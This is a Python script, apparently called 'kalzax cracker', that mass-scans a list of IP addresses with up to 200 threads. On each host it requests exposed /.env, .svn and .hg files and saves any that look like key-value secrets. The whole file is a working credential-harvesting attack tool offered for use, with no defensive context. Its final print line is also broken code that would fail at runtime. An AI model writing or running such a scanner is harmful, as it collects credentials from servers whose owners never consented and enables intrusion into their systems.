import threading
import requests
import os
import re
import queue

if os.name == 'nt':
    import win32api

MAX_THREADS = 200

ip_queue = queue.Queue()

success_count = 0
fail_count = 0
error_count = 0

def update_window_title():
    while True:
        title = f"kalzax cracker - succès : {success_count} - échec : {fail_count} - erreur : {error_count}"
        if os.name == 'nt':
            win32api.SetConsoleTitle(title)
        else:
            print('\33]0;' + title + '\a', end='', flush=True)

title_thread = threading.Thread(target=update_window_title)
title_thread.daemon = True
title_thread.start()

def http_request(ip):
    global success_count, fail_count, error_count
    base_url = f"http://{ip}"

    paths_to_check = ["/.env", "/.svn/entries", "/.hg/dirstate"]

    for path in paths_to_check:
        url = base_url + path
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                response_content = response.text
                if '=' in response_content and not re.search(r'<meta\s|<response\s|<head|<body|<script', response_content, re.IGNORECASE):
                    file_name = f"./ip/{ip}_{path.replace('/', '_')}.txt"
                    with open(file_name, "w") as file:
                        file.write(response_content)
                    print(f"{ip} {path} succes {file_name}")
                    success_count += 1
                    break
                else:
                    fail_count += 1
            else:
                error_count += 1
        except requests.RequestException as e:
            fail_count += 1

def process_ips():
    while not ip_queue.empty():
        ip = ip_queue.get()
        http_request(ip)
        ip_queue.task_done()

input_file = "ips.txt"

with open(input_file, "r") as ip_file:
    for line in ip_file:
        ip = line.strip()
        if ip:
            ip_queue.put(ip)

threads = []
for _ in range(min(MAX_THREADS, ip_queue.qsize())):
    thread = threading.Thread(target=process_ips)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Valid : "+{success_count}+" / Unvalid :"+{fail_count}+" / Fail : "+{error_count})
